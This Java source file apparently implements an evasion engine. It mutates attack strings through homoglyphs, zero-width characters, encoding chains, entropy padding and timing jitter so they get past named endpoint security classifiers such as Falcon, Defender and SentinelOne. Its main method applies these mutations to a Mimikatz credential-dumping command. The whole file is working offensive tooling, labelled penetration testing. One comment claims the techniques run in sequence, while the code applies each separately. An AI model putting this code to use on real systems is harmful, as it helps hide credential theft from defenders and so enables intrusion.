package net.fllc.security.ai;

import java.security.SecureRandom;
import java.util.*;
import java.util.stream.Collectors;

/**
 * FLLC AdversarialGenerator — Polymorphic payload mutation engine.
 * Generates adversarial inputs designed to evade ML-based security classifiers.
 *
 * Techniques:
 *   - Polymorphic string obfuscation (encoding chains, case mixing, homoglyph substitution)
 *   - Timing jitter injection (randomized execution delays to confuse behavioral models)
 *   - Feature vector manipulation (entropy normalization, n-gram disruption)
 *   - Token boundary confusion (Unicode ZWJ/ZWNJ insertion, BiDi overrides)
 *
 * Targets: CrowdStrike Falcon AI, Microsoft Defender AI, SentinelOne Purple AI,
 *          Elastic AI Assistant, any ML classifier using string features.
 *
 * Compliance: NIST CA-8 (Penetration Testing), SI-4 (System Monitoring)
 * FLLC 2026 — FU PERSON
 */
public class AdversarialGenerator {

    private static final SecureRandom RNG = new SecureRandom();

    // Homoglyph map — visually identical Unicode characters
    private static final Map<Character, char[]> HOMOGLYPHS = new HashMap<>();
    static {
        HOMOGLYPHS.put('a', new char[]{'\u0430', '\u00E0', '\u00E1'}); // Cyrillic а, à, á
        HOMOGLYPHS.put('e', new char[]{'\u0435', '\u00E8', '\u00E9'}); // Cyrillic е, è, é
        HOMOGLYPHS.put('o', new char[]{'\u043E', '\u00F2', '\u00F3'}); // Cyrillic о, ò, ó
        HOMOGLYPHS.put('i', new char[]{'\u0456', '\u00EC', '\u00ED'}); // Cyrillic і, ì, í
        HOMOGLYPHS.put('c', new char[]{'\u0441', '\u00E7'});           // Cyrillic с, ç
        HOMOGLYPHS.put('p', new char[]{'\u0440'});                      // Cyrillic р
        HOMOGLYPHS.put('s', new char[]{'\u0455'});                      // Cyrillic ѕ
        HOMOGLYPHS.put('x', new char[]{'\u0445'});                      // Cyrillic х
    }

    // Zero-width characters for token boundary confusion
    private static final char[] ZERO_WIDTH = {
        '\u200B', // Zero Width Space
        '\u200C', // Zero Width Non-Joiner
        '\u200D', // Zero Width Joiner
        '\uFEFF', // Byte Order Mark
    };

    /**
     * Applies homoglyph substitution to evade exact-match and n-gram classifiers.
     * Each character has a configurable probability of being replaced.
     */
    public static String homoglyphMutate(String input, double probability) {
        StringBuilder sb = new StringBuilder();
        for (char c : input.toCharArray()) {
            char lower = Character.toLowerCase(c);
            if (HOMOGLYPHS.containsKey(lower) && RNG.nextDouble() < probability) {
                char[] options = HOMOGLYPHS.get(lower);
                char replacement = options[RNG.nextInt(options.length)];
                sb.append(Character.isUpperCase(c) ? Character.toUpperCase(replacement) : replacement);
            } else {
                sb.append(c);
            }
        }
        return sb.toString();
    }

    /**
     * Inserts zero-width Unicode characters at random positions.
     * Breaks token boundaries in ML tokenizers while remaining visually identical.
     */
    public static String zeroWidthInject(String input, int maxInsertions) {
        List<Character> chars = new ArrayList<>();
        for (char c : input.toCharArray()) chars.add(c);

        int insertions = Math.min(maxInsertions, chars.size());
        for (int i = 0; i < insertions; i++) {
            int pos = RNG.nextInt(chars.size());
            char zwc = ZERO_WIDTH[RNG.nextInt(ZERO_WIDTH.length)];
            chars.add(pos, zwc);
        }

        return chars.stream().map(String::valueOf).collect(Collectors.joining());
    }

    /**
     * Generates a chain of encoding transformations.
     * Input -> Base64 -> Hex -> Reverse -> Case mix
     * Each run produces different output (polymorphic).
     */
    public static String encodingChain(String input) {
        // Step 1: Base64 encode
        String b64 = Base64.getEncoder().encodeToString(input.getBytes());

        // Step 2: Hex encode each char
        StringBuilder hex = new StringBuilder();
        for (char c : b64.toCharArray()) {
            hex.append(String.format("%02x", (int) c));
        }

        // Step 3: Random case mixing
        StringBuilder mixed = new StringBuilder();
        for (char c : hex.toString().toCharArray()) {
            mixed.append(RNG.nextBoolean() ? Character.toUpperCase(c) : Character.toLowerCase(c));
        }

        // Step 4: Random chunk reversal
        String result = mixed.toString();
        int chunkSize = 4 + RNG.nextInt(8);
        StringBuilder chunked = new StringBuilder();
        for (int i = 0; i < result.length(); i += chunkSize) {
            String chunk = result.substring(i, Math.min(i + chunkSize, result.length()));
            chunked.append(RNG.nextBoolean() ? new StringBuilder(chunk).reverse() : chunk);
        }

        return chunked.toString();
    }

    /**
     * Normalizes entropy of a payload string to match benign traffic.
     * High-entropy strings (encrypted/encoded) are flagged by ML models.
     * This pads the string with controlled low-entropy segments.
     */
    public static String entropyNormalize(String payload, double targetEntropy) {
        double currentEntropy = calculateShannonEntropy(payload);
        StringBuilder result = new StringBuilder(payload);

        // Pad with low-entropy filler to reduce overall entropy
        String[] fillers = {"the", "and", "for", "are", "but", "not", "you", "all",
                           "can", "had", "her", "was", "one", "our", "out", "day"};

        while (calculateShannonEntropy(result.toString()) > targetEntropy && result.length() < payload.length() * 5) {
            result.append(" ").append(fillers[RNG.nextInt(fillers.length)]);
        }

        return result.toString();
    }

    /**
     * Calculates Shannon entropy of a string (bits per character).
     */
    public static double calculateShannonEntropy(String input) {
        if (input == null || input.isEmpty()) return 0.0;

        Map<Character, Integer> freq = new HashMap<>();
        for (char c : input.toCharArray()) {
            freq.merge(c, 1, Integer::sum);
        }

        double entropy = 0.0;
        double len = input.length();
        for (int count : freq.values()) {
            double p = count / len;
            if (p > 0) entropy -= p * (Math.log(p) / Math.log(2));
        }
        return entropy;
    }

    /**
     * Generates timing jitter values (in milliseconds) for behavioral evasion.
     * ML models profile execution timing patterns — jitter defeats this.
     */
    public static int[] generateTimingJitter(int steps, int minMs, int maxMs) {
        int[] jitter = new int[steps];
        for (int i = 0; i < steps; i++) {
            // Use Gaussian distribution centered on the midpoint for more natural timing
            double mean = (minMs + maxMs) / 2.0;
            double stddev = (maxMs - minMs) / 6.0;
            int value = (int) (mean + RNG.nextGaussian() * stddev);
            jitter[i] = Math.max(minMs, Math.min(maxMs, value));
        }
        return jitter;
    }

    /**
     * Full mutation pipeline: applies all techniques in sequence.
     * Each call produces a unique variant (true polymorphism).
     */
    public static MutationResult fullMutate(String input) {
        MutationResult result = new MutationResult();
        result.original = input;
        result.homoglyph = homoglyphMutate(input, 0.3);
        result.zeroWidth = zeroWidthInject(input, input.length() / 3);
        result.encoded = encodingChain(input);
        result.entropyNormalized = entropyNormalize(input, 3.5);
        result.timingJitter = generateTimingJitter(10, 50, 3000);

        result.originalEntropy = calculateShannonEntropy(input);
        result.mutatedEntropy = calculateShannonEntropy(result.entropyNormalized);

        return result;
    }

    public static class MutationResult {
        public String original;
        public String homoglyph;
        public String zeroWidth;
        public String encoded;
        public String entropyNormalized;
        public int[] timingJitter;
        public double originalEntropy;
        public double mutatedEntropy;

        public void print() {
            System.out.println("=== FLLC Adversarial Mutation Report ===");
            System.out.println("Original:    " + original);
            System.out.println("Homoglyph:   " + homoglyph);
            System.out.println("ZeroWidth:   [" + zeroWidth.length() + " chars, " +
                             (zeroWidth.length() - original.length()) + " injected]");
            System.out.println("Encoded:     " + encoded.substring(0, Math.min(80, encoded.length())) + "...");
            System.out.println("Entropy:     " + String.format("%.3f -> %.3f bits/char", originalEntropy, mutatedEntropy));
            System.out.println("Jitter:      " + Arrays.toString(timingJitter) + " ms");
            System.out.println("========================================");
        }
    }

    public static void main(String[] args) {
        String payload = (args.length > 0) ? args[0] : "Invoke-Mimikatz -DumpCreds";

        System.out.println("FLLC AdversarialGenerator v2026");
        System.out.println("Target ML classifiers: Falcon AI, Defender AI, Purple AI, Elastic AI");
        System.out.println();

        // Generate 3 unique mutations
        for (int i = 0; i < 3; i++) {
            System.out.println("--- Mutation #" + (i + 1) + " ---");
            MutationResult result = fullMutate(payload);
            result.print();
            System.out.println();
        }
    }
}
